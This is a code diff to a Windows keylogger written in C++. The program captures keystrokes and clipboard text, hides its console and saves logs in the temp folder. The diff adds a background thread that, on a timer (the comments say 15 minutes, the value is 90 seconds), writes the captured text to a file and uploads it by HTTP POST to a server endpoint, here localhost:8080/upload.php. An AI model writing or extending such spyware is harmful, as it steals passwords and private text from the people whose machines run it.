@@ -1,5 +1,6 @@
 #include <Windows.h>
 #include <iostream>
+#include <thread>
 #include <string>
 #include <fstream>
 
@@ -61,6 +62,8 @@ HHOOK mouseHook;
 char tempFolderPath[MAX_PATH]; // istancing a char array to memorize the TempFolder Path
 DWORD result = GetTempPathA(MAX_PATH, tempFolderPath); // getting the TempFolder Path due to windows' function
 const std::string FilePath = (std::string)tempFolderPath + "logs.txt"; // setting the path of where i'm going to save the key pressed
+
+const std::chrono::seconds waitTime = std::chrono::seconds(int(/* => minutes */ 90)); // seconds -> 15 minutes
 
 std::string clipBoardLastSave = ""; // saving the text in the windows' clipBoard
 std::string contentFile = ""; // save everything of what is been writing down
@@ -546,9 +549,49 @@ static std::string StartString()
 	return startString;
 }
 
+// thread function
+static void timeCheck() {
+	std::string tmp;
+	while (true) {
+		// Wait 15 minutes
+		std::this_thread::sleep_for(waitTime);
+		tmp = contentFile;
+		contentFile = "";
+		std::ofstream outputFile(FilePath);
+		if (outputFile.is_open()) outputFile << tmp;
+		outputFile.close();
+
+		// sending the file to the server
+		CURL* curl;
+		CURLcode res;
+		curl_global_init(CURL_GLOBAL_ALL);
+		curl = curl_easy_init();
+
+		if (curl) {
+			curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:8080/upload.php");
+			curl_mime* mime;
+			curl_mimepart* part;
+			mime = curl_mime_init(curl);
+			part = curl_mime_addpart(mime);
+			curl_mime_name(part, "file");
+			curl_mime_filedata(part, FilePath.c_str());
+			curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);
+			res = curl_easy_perform(curl);
+			curl_easy_cleanup(curl);
+			curl_mime_free(mime);
+		}
+		curl_global_cleanup();
+		
+		// here I check if meanwhile that I have sent the mail, the user has typed some more keys
+		(contentFile != "") ? (tmp = StartString() + contentFile, contentFile = tmp) : (contentFile = StartString());
+	}
+}
+
 // main function
 int main()
 {
+	std::thread t(timeCheck); // istancing a thread
+
 	FreeConsole(); // disconnect the console when the program is running
 
 	contentFile = StartString(); // update content file at start
